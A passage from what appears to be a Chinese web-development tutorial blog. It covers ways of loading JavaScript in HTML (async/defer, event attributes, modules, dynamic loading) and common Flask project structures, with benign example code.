class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Defer and Async Example<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;script1.js&quot;</span> <span class="hljs-attr">async</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;script2.js&quot;</span> <span class="hljs-attr">defer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Async vs Defer<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h3 id="4-事件属性中的-JavaScript"><a href="#4-事件属性中的-JavaScript" class="headerlink" title="4. 事件属性中的 JavaScript"></a>4. <strong>事件属性中的 JavaScript</strong></h3><p>JavaScript 代码还可以直接嵌入到 HTML 元素的事件属性中（如 <code>onclick</code>、<code>onchange</code> 等）。这种方式直接将 JavaScript 写入元素的属性值中，常用于处理简单的事件响应。</p><h4 id="用法：-4"><a href="#用法：-4" class="headerlink" title="用法："></a>用法：</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Event Attribute Example<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;Button clicked!&#x27;)&quot;</span>&gt;</span>Click Me!<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="适用场景：-2"><a href="#适用场景：-2" class="headerlink" title="适用场景："></a>适用场景：</h4><ul><li>适用于简单的事件处理，比如按钮点击时弹出提示框。</li><li>快速实现小的交互功能。</li></ul><h4 id="注意事项：-2"><a href="#注意事项：-2" class="headerlink" title="注意事项："></a>注意事项：</h4><ul><li><strong>可维护性差</strong>：将 JavaScript 直接写在 HTML 中会使得代码难以维护，尤其是在复杂应用中，事件处理应通过外部脚本或事件监听器完成。</li><li><strong>安全性问题</strong>：与内联 JavaScript 类似，容易导致 XSS 攻击。</li></ul><hr><h3 id="5-模块化-JavaScript"><a href="#5-模块化-JavaScript" class="headerlink" title="5. 模块化 JavaScript (&lt;script type=&quot;module&quot;&gt;)"></a>5. <strong>模块化 JavaScript (<code>&lt;script type=&quot;module&quot;&gt;</code>)</strong></h3><p>ES6 引入了模块系统，可以通过 <code>&lt;script type=&quot;module&quot;&gt;</code> 来加载 JavaScript 模块文件。这种方式让开发者能够使用模块化的代码组织方式，从而更好地管理大型项目的依赖。</p><h4 id="用法：-5"><a href="#用法：-5" class="headerlink" title="用法："></a>用法：</h4><p>首先，创建一个模块文件 <code>module.js</code>：</p><p><strong><code>module.js</code> 文件：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello from the module!&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后，在 HTML 中引入模块并使用：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>JavaScript Modules Example<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;module&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">import</span> &#123; greet &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./module.js&#x27;</span>;</span><br><span class="language-javascript">        <span class="hljs-title function_">greet</span>();</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>JavaScript Modules<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="适用场景：-3"><a href="#适用场景：-3" class="headerlink" title="适用场景："></a>适用场景：</h4><ul><li>适合大型应用程序，能够以模块化的方式组织代码。</li><li>允许使用 ES6 的 <code>import</code> 和 <code>export</code>，便于依赖管理。</li></ul><h4 id="注意事项：-3"><a href="#注意事项：-3" class="headerlink" title="注意事项："></a>注意事项：</h4><ul><li><strong>浏览器支持</strong>：现代浏览器都支持 <code>&lt;script type=&quot;module&quot;&gt;</code>，但在旧浏览器中可能不兼容。</li><li><strong>严格模式</strong>：模块文件中默认使用严格模式（<code>strict mode</code>），这会带来更严格的语法检查。</li></ul><hr><h3 id="6-动态加载-JavaScript"><a href="#6-动态加载-JavaScript" class="headerlink" title="6. 动态加载 JavaScript"></a>6. <strong>动态加载 JavaScript</strong></h3><p>有时，JavaScript 文件需要在特定条件下或事件发生后再动态加载。这种方式通常用于提高性能或在特定功能需求时加载额外的脚本。</p><h4 id="用法：-6"><a href="#用法：-6" class="headerlink" title="用法："></a>用法：</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Dynamic Script Loading Example<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;loadScriptButton&quot;</span>&gt;</span>Load Script<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;loadScriptButton&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">let</span> script = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;script&#x27;</span>);</span><br><span class="language-javascript">            script.<span class="hljs-property">src</span> = <span class="hljs-string">&#x27;dynamic-script.js&#x27;</span>;</span><br><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(script);</span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="适用场景：-4"><a href="#适用场景：-4" class="headerlink" title="适用场景："></a>适用场景：</h4><ul><li>动态加载资源以减少初始页面加载时间。</li><li>按需加载脚本，例如用户点击按钮后才加载脚本。</li></ul><h4 id="注意事项：-4"><a href="#注意事项：-4" class="headerlink" title="注意事项："></a>注意事项：</h4><ul><li>动态加载的脚本是异步的，因此要确保依赖关系不会被破坏。如果需要按顺序加载多个动态脚本，可以通过回调或 <code>Promise</code> 来控制。</li></ul><hr><p>好的！接下来我将详细展开 <strong>Flask 框架架构与基础概念、常见的安全漏洞、攻击利用方法、安全防御措施、漏洞总结等</strong>，包括详细的代码示例和解释。</p><hr><h2 id="Flask-框架架构与基础概念"><a href="#Flask-框架架构与基础概念" class="headerlink" title="Flask 框架架构与基础概念"></a>Flask 框架架构与基础概念</h2><h2 id="1-简单-Flask-项目结构"><a href="#1-简单-Flask-项目结构" class="headerlink" title="1. 简单 Flask 项目结构"></a><strong>1. 简单 Flask 项目结构</strong></h2><p><strong>适用场景</strong>：小型或实验性项目，用于快速构建。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash复制代码/project-root<br>│<br>├── app.py              <span class="hljs-comment"># Flask 应用主入口</span><br>├── /static             <span class="hljs-comment"># 静态资源目录（CSS、JS、图片）</span><br>│   ├── style.css<br>│   └── script.js<br>├── /templates          <span class="hljs-comment"># HTML 模板目录</span><br>│   └── index.html      <span class="hljs-comment"># 主页面模板</span><br>├── requirements.txt    <span class="hljs-comment"># Python 依赖包列表</span><br>└── README.md           <span class="hljs-comment"># 项目说明文件</span><br></code></pre></td></tr></table></figure><p><strong>示例代码：<code>app.py</code></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">python复制代码<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><hr><h2 id="2-基于蓝图的-Flask-项目结构"><a href="#2-基于蓝图的-Flask-项目结构" class="headerlink" title="2. 基于蓝图的 Flask 项目结构"></a><strong>2. 基于蓝图的 Flask 项目结构</strong></h2><p><strong>适用场景</strong>：适用于中型项目，通过蓝图（Blueprint）模块化管理路由和逻辑。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash复制代码/project-root<br>│<br>├── app.py              <span class="hljs-comment"># Flask 应用入口文件</span><br>├── /static             <span class="hljs-comment"># 静态资源目录</span><br>│   ├── style.css<br>│   └── script.js<br>├── /templates          <span class="hljs-comment"># HTML 模板目录</span><br>│   └── index.html<br>├── /blueprints         <span class="hljs-comment"># 蓝图模块</span><br>│   ├── __init__.py     <span class="hljs-comment"># 初始化蓝图</span><br>│   └── user.py         <span class="hljs-comment"># 用户相关路由和逻辑</span><br>├── requirements.txt    <span class="hljs-comment"># 项目依赖</span><br>└── README.md           <span class="hljs-comment"># 项目说明</span><br></code></pre></td></tr></table></figure><p><strong>示例：<code>blueprints/user.py</code></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">python复制代码<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Blueprint, render_template<br><br>user_bp = Blueprint(<span class="hljs-string">&#x27;user&#x27;</span>, __name__)<br><br><span class="hljs-meta">@user_bp.route(<span class="hljs-params"><span class="hljs-string">&#x27;/user/&lt;username&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">profile</span>(<span class="hljs-params">username</span>):<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;profile.html&#x27;</span>, username=username)<br></code></pre></td></tr></table></figure><p><strong>在 <code>app.py</code> 中注册蓝图：</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">python复制代码<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> blueprints.<span class="hljs-keyword">user</span> <span class="hljs-keyword">import</span> user_bp<br><br>app = Flask(__name__)<br>app.register_blueprint(user_bp)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<span class="hljs-keyword">debug</span>=<span class="hljs-keyword">True</span>)<br></code></pre></td></tr></table></figure><hr><h2 id="3-RESTful-API-项目结构"><a href="#3-RESTful-API-项目结构" class="headerlink" title="3. RESTful API 项目结构"></a><strong>3. RESTful API 项目结构</strong></h2><p><strong>适用场景</strong>：开发 RESTful API，前后端分离的项目。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash复制代码/project-root<br>│<br>├── app.py              <span class="hljs-comment"># Flask 应用入口文件</span><br>├── /api                <span class="hljs-comment"># API 模块目录</span><br>│   ├── __init__.py     <span class="hljs-comment"># 初始化 API 蓝图</span><br>│   └── routes.py       <span class="hljs-comment"># API 路由</span><br>├── /models             <span class="hljs-comment"># 数据模型目录</span><br>│   └── user.py         <span class="hljs-comment"># 用户模型定义</span><br>├── /config             <span class="hljs-comment"># 配置文件目录</span><br>│   └── settings.py     <span class="hljs-comment"># 应用配置</span><br>├── requirements.txt    <span class="hljs-comment"># 依赖列表</span><br>└── README.md           <span class="hljs-comment"># 项目说明</span><br></code></pre></td></tr></table></figure><p><strong>示例：<code>api/routes.py</code></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">python复制代码<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Blueprint, jsonify<br><br>api_bp = Blueprint(<span class="hljs-string">&#x27;api&#x27;</span>, __name__)<br><br><span class="hljs-meta">@api_bp.route(<span class="hljs-params"><span class="hljs-string">&#x27;/api/users&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_users</span>():<br>    users = [&#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Alice&quot;</span>&#125;, &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Bob&quot;</span>&#125;]<br>    <span class="hljs-keyword">return</span> jsonify(users)<br></code></pre></td></tr></table></figure><p><strong>在 <code>app.py</code> 中注册 API 蓝图：</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">python复制代码<span class="hljs-keyword">from</span> flask import Flask<br><span class="hljs-keyword">from</span> api.routes import api_bp<br><br>app = Flask(__name__)<br>app.register_blueprint(api_bp, <span class="hljs-attribute">url_prefix</span>=<span class="hljs-string">&#x27;/api&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.<span class="hljs-built_in">run</span>(<span class="hljs-attribute">debug</span>=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><hr><h2 id="4-大型-Flask-项目结构"><a href="#4-大型-Flask-项目结构" class="headerlink" title="4. 大型 Flask 项目结构"></a><strong>4. 大型 Flask 项目结构</strong></h2><p><strong>适用场景</strong>：大型项目，使用多个模块、数据库、认证逻辑和配置。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash复制代码/project-root<br>│<br>├── /app                <span class="hljs-comment"># Flask 应用目录</span><br>│   ├── __init__.py     <span class="hljs-comment"># 应用初始化</span><br>│   ├── /auth           <span class="hljs-comment"># 认证模块</span><br>│   │   ├── routes.py   <span class="hljs-comment"># 登录、注册路由</span><br>│   │   └── forms.py    <span class="hljs-comment"># 登录表单逻辑</span><br>│   ├── /main           <span class="hljs-comment"># 主应用模块</span><br>│   │   └── routes.py   <span class="hljs-comment"># 主页面路由</span><br>│   ├── /models         <span class="hljs-comment"># 数据模型</span><br>│   │   └── user.py     <span class="hljs-comment"># 用户数据模型</span><br>│   └── /templates      <span class="hljs-comment"># HTML 模板目录</span><br>│       ├── base.html   <span class="hljs-comment"># 基础模板</span><br>│       └── index.html  <span class="hljs-comment"># 主页面模板</span><br>│<br>├── /migrations         <span class="hljs-comment"># 数据库迁移文件</span><br>├── /instance           <span class="hljs-comment"># 本地配置文件</span><br>│   └── config.py       <span class="hljs-comment"># 本地配置</span><br>├── config.py           <span class="hljs-comment"># 默认配置文件</span><br>├── manage.py           <span class="hljs-comment"># 项目管理脚本</span><br>├── requirements.txt    <span class="hljs-comment"># 依赖包列表</span><br>└── README.md           <span class="hljs-comment"># 项目说明</span><br></code></pre></td></tr></table></figure><p><strong><code>app/__init__.py</code> 示例：</strong></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gradle">python复制代码<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><br><span class="hljs-keyword">def</span> create_app():<br>    app = Flask(__name__)<br>    app.config.from_object(<span class="hljs-string">&#x27;config&#x27;</span>)<br><br>    <span class="hljs-keyword">from</span> app.auth.routes <span class="hljs-keyword">import</span> auth_bp<br>    <span class="hljs-keyword">from</span> app.main.routes <span class="hljs-keyword">import</span> main_bp<br><br>    app.register_blueprint(auth_bp)<br>    app.register_blueprint(main_bp)<br><br>    <span class="hljs-keyword">return</span> app<br></code></pre></td></tr></table></figure><p><strong><code>manage.py</code> 示例：</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">python复制代码<span class="hljs-keyword">from</span> app import create_app<br><br>app = create_app()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.<span class="hljs-built_in">run</span>()<br></code></pre></td></tr></table></figure><hr><h2 id="5-Flask-SQLAlchemy-项目结构"><a href="#5-Flask-SQLAlchemy-项目结构" class="headerlink" title="5. Flask + SQLAlchemy 项目结构"></a><strong>5. Flask + SQLAlchemy 项目结构</strong></h2><p><strong>适用场景</strong>：需要使用数据库（如 <strong>PostgreSQL</strong> 或 <strong>MySQL</strong>）的项目。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash复制代码/project-root<br>│<br>├── app.py              <span class="hljs-comment"># 应用入口文件</span><br>├── /models             <span class="hljs-comment"># 数据模型目录</span><br>│   └── user.py         <span class="hljs-comment"># 用户模型定义</span><br>├── /migrations         <span class="hljs-comment"># 数据库迁移文件</span><br>├── config.py           <span class="hljs-comment"># 数据库和应用配置</span><br>├── requirements.txt    <span class="hljs-comment"># 依赖包列表</span><br>└── README.md           <span class="hljs-comment"># 项目说明</span><br></code></pre></td></tr></table></figure><p><strong><code>models/user.py</code> 示例：</strong></p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">python</span>复制代码from flask_sqlalchemy <span class="hljs-keyword">import</span> SQLAlchemy<br><br><span class="hljs-title">db</span> = <span class="hljs-type">SQLAlchemy</span>()<br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-type">User</span>(<span class="hljs-title">db</span>.<span class="hljs-type">Model</span>):</span><br><span class="hljs-class">    id = db.<span class="hljs-type">Column</span>(<span class="hljs-title">db</span>.<span class="hljs-type">Integer</span>, <span class="hljs-title">primary_key</span>=<span class="hljs-type">True</span>)</span><br><span class="hljs-class">    username = db.<span class="hljs-type">Column</span>(<span class="hljs-title">db</span>.<span class="hljs-type">String(80)</span>, <span class="hljs-title">unique</span>=<span class="hljs-type">True</span>, <span class="hljs-title">nullable</span>=<span class="hljs-type">False</span>)</span><br><span class="hljs-class">    email = db.<span class="hljs-type">Column</span>(<span class="hljs-title">db</span>.<span class="hljs-type">String(120)</span>, <span class="hljs-title">unique</span>=<span class="hljs-type">True</span>, <span class="hljs-title">nullable</span>=<span class="hljs-type">False</span>)</span><br></code></pre></td></tr></table></figure><p><strong>在 <code>app.py</code> 中初始化数据库：</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">python复制代码<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> models.<span class="hljs-keyword">user</span> <span class="hljs-keyword">import</span> db<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>] = <span class="hljs-string">&#x27;sqlite:///app.db&#x27;</span><br><br>db.init_app(app)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<span class="hljs-keyword">debug</span>=<span class="hljs-keyword">True</span>)<br></code></pre></td></tr></table></figure><hr><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a><strong>总结</strong></h2><ol><li><strong>简单项目</strong>：适合快速实验和小型应用。</li><li><strong>基于蓝图的项目</strong>：通过模块化提高代码的可维护性。</li><li><strong>RESTful API 项目</strong>：用于前后端分离，常见于现代 Web 项目。</li><li><strong>大型 Flask 项目</strong>：包含认证、数据库、模板等完整的功能。</li><li><strong>Flask + SQLAlchemy</strong>：用于处理复杂的数据模型和数据库交互。</li></ol><h3 id="路由机制"><a href="#路由机制" class="headerlink" title="路由机制"></a>路由机制</h3><p>Flask 路由机制通过 <code>@app.route()</code> 装饰器来将 URL 映射到对应的函数。这意味着，用户访问某个 URL 时，Flask 会自动调用对应的视图函数，并返回结果给用户。</p><p><strong>代码示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span 